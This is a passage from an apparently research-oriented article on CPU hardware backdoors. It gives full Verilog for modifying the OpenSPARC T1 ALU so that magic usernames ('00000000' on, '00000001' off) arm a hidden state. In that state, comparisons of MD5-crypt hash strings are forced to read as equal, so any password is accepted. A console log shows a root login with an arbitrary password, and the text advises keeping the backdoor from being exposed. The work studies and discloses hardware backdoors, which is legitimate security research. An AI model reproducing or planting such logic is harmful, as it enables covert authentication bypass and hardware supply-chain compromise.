                       .isxor(ecl_alu_log_sel_xor_e),
                       .pass_rs2_data(ecl_alu_log_sel_move_e),
                       .inv_logic(invert_e), .logic_out(logic_out[63:0]),
                       .ifu_exu_sethi_inst_e(ecl_alu_sethi_inst_e));

   // Mux between sum predict and logic outputs for zcc
   dp_mux2es #(64)  zcompmux(.dout(zcomp_in[63:0]),
                           .in0(logic_out[63:0]),
                           .in1(spr_out[63:0]),
                           .sel(ecl_alu_out_sel_sum_e));

   // Zero comparison for zero cc
//   sparc_exu_aluzcmp64 zcccmp(.in(zcomp_in[63:0]), 
//                          .zero64(alu_ecl_z64_e),
//                          .zero32(alu_ecl_z32_e));
   assign        alu_ecl_zlow_e = ~(|zcomp_in[31:0]);
   assign        alu_ecl_zhigh_e = ~(|zcomp_in[63:32]);

   // Get Negative ccs
   assign   alu_ecl_add_n64_e = adder_out[63];
   assign   alu_ecl_add_n32_e = adder_out[31];
   assign   alu_ecl_log_n64_e = logic_out[63];
   assign   alu_ecl_log_n32_e = logic_out[31];

   
   // Mux for output
   mux4ds #(64) output_mux(.dout(alu_byp_rd_data_e[63:0]), 
                         .in0(adder_out[63:0]),
                         .in1(byp_alu_rs3_data_e[63:0]),
                         .in2(shft_alu_shift_out_e[63:0]),
                         .in3(logic_out[63:0]), 
                         .sel0(ecl_alu_out_sel_sum_e),
                         .sel1(ecl_alu_out_sel_rs3_e),
                         .sel2(ecl_alu_out_sel_shift_e),
                         .sel3(ecl_alu_out_sel_logic_e));

   // memory address checks
   sparc_exu_alu_16eql chk_mem_addr(.equal(alu_ecl_mem_addr_invalid_e_l),
                                    .in(va_e[63:47]));
   
endmodule  // sparc_exu_alu

The ALU contains sparc_exu_alulogic and sparc_exu_aluaddsub modules.  The
former is responsible for logical operations, while the latter is
responsible for addition and subtraction. The backdoor is on SUBcc
instruction, therefore will need to make changes to the sparc_exu_aluaddsub
module. 

In this module alone, we almost get everything to implement the backdoor.
For example, from the inputs, byp_alu_rs1_data_e and byp_alu_rs2_data_e are
the two operands value. ecl_alu_cin_e and ifu_exu_invert_d tell us whether
this operation is addition or subtraction.  It was enough for an adder
module, but for us, we also need the information about the rd register.
Because, as mentioned earlier, CMP is a pseudo instruction.

"cmp reg rs1 , reg_or_imm" is "subcc reg rs1 , reg_or_imm, %g0"

The rd is the destination register index of which content needs to be
updated in the Write stage. A SUBcc instruction with rd = 0 can be used to
effect a signed or unsigned integer comparison. It does not change any
general register because g0 is a special register that always is zero. The
rd index is encoded in the instruction, which is available after the Decode
stage, and the sparc_exu_ecl(control logic) module stores all its pipeline
registers. So we got ecl_alu_rd_e from the ecl. The suffix _e indicates
that this signal is used in the Execution stage. We need this information
to tell the difference between CMP and SUBcc instruction. Soon I will
explain why this is important.

Here is the sparc_exu_aluaddsub module before we add the backdoor. 

module sparc_exu_aluaddsub
  (/*AUTOARG*/
   // Outputs
   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
   // Inputs
   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, 
   ifu_exu_invert_d
   );
   input clk;
   input se;
   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
   input         ecl_alu_cin_e;           // carry in
   input         ifu_exu_invert_d;     // subtract used by adder

   output [63:0] adder_out; // result of adder
   output [63:0] spr_out;   // result of sum predict
   output         alu_ecl_cout64_e_l;
   output         alu_ecl_cout32_e;
   output       alu_ecl_adderin2_63_e;
   output       alu_ecl_adderin2_31_e;
   
   wire [63:0]  rs2_data;       // 2nd input to adder
   wire [63:0]  rs1_data;       // 1st input to adder
   wire [63:0]  subtract_d;
   wire [63:0]  subtract_e;
   wire         cout64_e;
   
////////////////////////////////////////////
//  Module implementation
////////////////////////////////////////////
   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk), 
                       .q(subtract_e[63:0]), .se(se),
                       .si(), .so());

   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];

   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
   
   assign   alu_ecl_adderin2_63_e = rs2_data[63];
   assign   alu_ecl_adderin2_31_e = rs2_data[31];
   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), 
                              .rs2_data(rs2_data[63:0]),
                              .cin(ecl_alu_cin_e), 
                              .adder_out(adder_out[63:0]),
                              .cout32(alu_ecl_cout32_e), 
                              .cout64(cout64_e));
   assign   alu_ecl_cout64_e_l = ~cout64_e;


   // sum predict
   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), 
                        .rs2_data(rs2_data[63:0]), 
                        .cin(ecl_alu_cin_e),
                        .spr_out(spr_out[63:0]));

endmodule // sparc_exu_aluaddsub

In a CPU, addition and subtraction are all computed as additions. The
difference is that subtraction takes the complement of the subtrahend and
then adds. The ifu_exu_invert_d indicates a subtraction and is used to flip
all the bits of the second operands. It is sent in the Decode stage, so the
pipeline register is required to save it to the next stage. ecl_alu_cin_e
is 1 in SUB and 0 in SUBC(SUB with Carry) instruction.

There is an adder and sparc_exu_aluspr for which the comment says sum
prediction. It is an optimized compare operation with carry, and if the two
operands are equal, spr_out is 0. We need to change their results to zero
if the ALU is computing subtraction on the hash string after activating the
backdoor so that the two hash strings appear to be equal.

The following is the sparc_exu_aluaddsub module after adding the backdoor.

module sparc_exu_aluaddsub
  (/*AUTOARG*/
   // Outputs
   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
   // Inputs
   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, 
   ecl_alu_rd_e, // uty: test 
   ifu_exu_invert_d
   );
   input clk;
   input se;
   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
   input         ecl_alu_cin_e;           // carry in
   input [4:0]   ecl_alu_rd_e;	       // uty: test
   input         ifu_exu_invert_d;     // subtract used by adder

   output [63:0] adder_out; // result of adder
   output [63:0] spr_out;   // result of sum predict
   output         alu_ecl_cout64_e_l;
   output         alu_ecl_cout32_e;
   output       alu_ecl_adderin2_63_e;
   output       alu_ecl_adderin2_31_e;
   
   wire [63:0]  rs2_data;       // 2nd input to adder
   wire [63:0]  rs1_data;       // 1st input to adder
   wire [63:0]  subtract_d;
   wire [63:0]  subtract_e;
   wire         cout64_e;

   wire [63:0]  spr_out_tmp;   // result of sum predict
   wire [63:0]  adder_out_tmp; // result of adder
   wire         alu_ecl_cout32_e_tmp;
   wire 	backdoor_on_keyword;
   wire		backdoor_off_keyword;
   wire		backdoor_nxt;
   wire		backdoor_r;
   wire		backdoor_en;
   wire		trigger_backdoor;
   wire		hash_begin;
   wire		hash_end;
   wire		hash_00;
   wire		hash_r;
   wire		hash_en;
   wire		hash_nxt;

   wire		issubrd0;
   wire		sub_e;

////////////////////////////////////////////
//  Module implementation
////////////////////////////////////////////
   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk), 
                     .q(subtract_e[63:0]), .se(se),
                     .si(), .so());

   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];

   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
   
   assign   alu_ecl_adderin2_63_e = rs2_data[63];
   assign   alu_ecl_adderin2_31_e = rs2_data[31];
   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), 
                              .rs2_data(rs2_data[63:0]),
                              .cin(ecl_alu_cin_e), 
                              .adder_out(adder_out_tmp[63:0]),
                              .cout32(alu_ecl_cout32_e_tmp), 
                              .cout64(cout64_e_tmp));
   assign   cout64_e = cout64_e_tmp | trigger_backdoor;
   assign   alu_ecl_cout64_e_l = ~cout64_e;
   assign   alu_ecl_cout32_e = alu_ecl_cout32_e_tmp | trigger_backdoor;


   // sum predict
   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), 
                        .rs2_data(rs2_data[63:0]), .cin(ecl_alu_cin_e),
                        .spr_out(spr_out_tmp[63:0]));

   // uty: test
   // 0x726f6f74 root
   
   // sub_e sub_dff is at sparc_exu_ecl, just put one here for convience
   dff_s alusub_dff(.din(ifu_exu_invert_d), .clk(clk), .q(sub_e), .se(se),
	   .si(), .so());
   
   assign backdoor_on_keyword = 
                        (64'h3030303030303030 == byp_alu_rs2_data_e[63:0])
                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
   assign backdoor_off_keyword = 
                        (64'h3030303030303031 == byp_alu_rs2_data_e[63:0])
                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);

   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;

   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));

   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
	   		.clk(clk), .q(backdoor_r), .se(se),
                     	.si(), .so());

   // only consider $1$ for now
   assign hash_begin =    ((24'h243124 == byp_alu_rs1_data_e[63:40])
                       && (24'h243124 == byp_alu_rs2_data_e[63:40]))
                        & issubrd0; 

   assign hash_00 =   (8'h0 == byp_alu_rs1_data_e[47:40])
                    & (8'h0 == byp_alu_rs2_data_e[47:40]); 
   assign hash_end = hash_r & hash_00 & issubrd0;

   assign hash_en = (hash_begin | hash_end) & backdoor_r;
   assign hash_nxt = hash_begin & (~hash_end);

   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
	   		.clk(clk), .q(hash_r), .se(se),
                     	.si(), .so());


   // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
   // instruction. (SUBC's ecl_alu_cin_e actually is 0)
   // hash_r will update at next cycle.
   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0; 

   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};

endmodule // sparc_exu_aluaddsub




backdoor_on_keyword and backdoor_on_keyword are signaled when the magic
word is input as the username when login. For testing, the magic keyword is
00000000 to turn on the backdoor and 00000001 to turn it off.  But the
magic word should be as strange as possible so that it is not easy to
conflict in the day-to-day operation of the system.

I want to implement a switch-like function where the back door stays open
until the off magic word is entered. So a DFF with enable is used to save
the current state. Following is the logic and truth table that describes
it. Under normal circumstances, backdoor_on_keyword and
backdoor_off_keyword will not appear simultaneously.


   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));

on_keyword  |  off_keyword   |    en     |  nxt    
     0              0              0         0
     0              1              1         0
     1              0              1         1  
     1              1              1         0             

When the backdoor is activated, all subsequent password verifications will
pass unconditionally. The key is determining whether the ALU is comparing
part of two hash strings because many instructions such as load and branch
also need to use the ALU.

   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;

A hash string must be divided into several 64-bit integers and compared
multiple times. The first thing to do is determine whether this is a CMP
instruction. Then judge by the pattern of the hash string, such as starting
with $1$ to determine whether the hash comparison has begun because the
subsequent comparison is only a string comparison, and there is no
noticeable pattern. 

$1$7c71x        0x2431243763373178
B0y$mPkM        0x423079246d506b4d
SwwbMWgE        0x537777624d576745
XsyD6YV/        0x587379443659562f
C1              0x4331

   assign hash_begin =   ((24'h243124 == byp_alu_rs1_data_e[63:40]) 
                      && (24'h243124 == byp_alu_rs2_data_e[63:40])) 
                       & issubrd0;

If 0x00 appears in both operands in the subsequent comparison, it means
that this is the last part of the hash string, and it should also pass. 

   assign hash_00 =   (8'h0 == byp_alu_rs1_data_e[47:40]) 
                    & (8'h0 == byp_alu_rs2_data_e[47:40]);
   assign hash_end = hash_r & hash_00 & issubrd0;


Adding more combinatorial logic can make this backdoor more applicable to
different hash algorithms. On the other hand, more combinational logic
requires a longer propagation time, so it can not be too complicated. For
testing, this part of the logic is a bit hardcoded. Simply filtering these
patterns in the operands may conflict with many benign CMP instructions.
However, the scenario of using this backdoor is to open the backdoor, log
in to any account, and then close the backdoor as quickly as possible. It
can avoid affecting other programs and prevent backdoor from being exposed.


Another DFF is used to save the state of whether the hash string comparison
continues. If its output is one, the current CMP instruction should be
compromised and return an equal result.


   assign hash_en = (hash_begin | hash_end) & backdoor_r;
   assign hash_nxt = hash_begin & (~hash_end);

   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
                        .clk(clk), .q(hash_r), .se(se),
                        .si(), .so());

   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;


The following screen output shows how the CPU backdoor works on the
OpenSPARC T1 FPGA system.

Ubuntu 7.10 t1-fpga-00 ttyS0

t1-fpga-00 login: 00000000
Password:                 ---> enter anything

Login incorrect
t1-fpga-00 login: root
Password:                   ---> enter anything
Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
2009 sparc64

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.  
root@t1-fpga-00:~# 

































--[ 5. References

[5] A Performance Evaluation of Platform-Independent Methods to Search for
    Hidden Instructions on RISC Processors.  
[6] Breaking the x86 ISA. BlackHat, USA, 2017.
[7] Uisfuzz: An efficient fuzzing method for CPU undocumented instruction
    searching. 
[8] Uncovering Hidden Instructions in Armv8-A Implementations. 
[9] VIA C3 Nehemiah Datasheet, 2004.
    http://datasheets.chipdb.org/VIA/Samuel2/VIA%20C3%20Samuel%202%20
    Datasheet%20V1.12.pdf
[10] Hardware backdoors in x86 CPUs. Black Hat, 2018.
[11] Apparatus and method for limiting access to model specific registers
     in a microprocessor, December 25 2012. US Patent 8,341,419.
[12] Microprocessor that performs X86 ISA and arm ISA machine language
     program instructions by hardware translation into microinstructions
     executed by common execution pipeline, November 4 2014. US Patent
     8,880,851.
[13] Microprocessor with boot indicator that indicates a boot ISA of the
     microprocessor as either the X86 ISA or the ARM ISA, April 19 2016. 
     US Patent 9,317,301.
[14] Microprocessor that enables ARM ISA program to access 64-bit general
     purpose registers written by x86 ISA program, March 22 2016. US 
     Patent 9,292,470.
[15] 'Super-secret' debugger discovered in AMD CPUs
     https://www.theregister.com/2010/11/15/amd_secret_debugger/
[16] AMD Undocumented Machine-Specific Registers
     http://cbid.softnology.biz/html/undocmsrs.html
[25] https://wiki.qemu.org/Documentation/TCG/frontend-ops
[26] https://docs.oracle.com/cd/E36784_01/pdf/E36858.pdf
[27] CPU bugs, CPU backdoors and consequences on security
[28] Live Migration with AMD-V Extended Migration Technology
     http://developer.amd.com/wordpress/media/2013/02/
     livevirtualmachinemigrationonamdprocessors.pdf
